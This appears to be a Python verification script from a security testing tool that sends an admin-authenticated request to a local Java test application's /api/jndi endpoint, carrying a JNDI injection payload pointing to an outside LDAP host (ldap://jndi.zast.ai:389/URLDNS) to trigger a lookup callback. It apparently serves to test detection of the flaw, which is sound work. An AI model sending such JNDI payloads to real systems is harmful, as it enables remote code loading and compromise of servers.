import requests

from zast_verifier import config


if __name__ == "__main__":
    base_url = "http://localhost:8450/java"

    response = requests.get(
        url=f"{base_url}/api/jndi",
        params={"url": "ldap://jndi.zast.ai:389/URLDNS"},
        headers=config.get_admin_headers(),
        cookies=config.get_admin_cookies()
    )

    print(f"Status: {response.status_code}")
    print(f"Response: {response.text}")
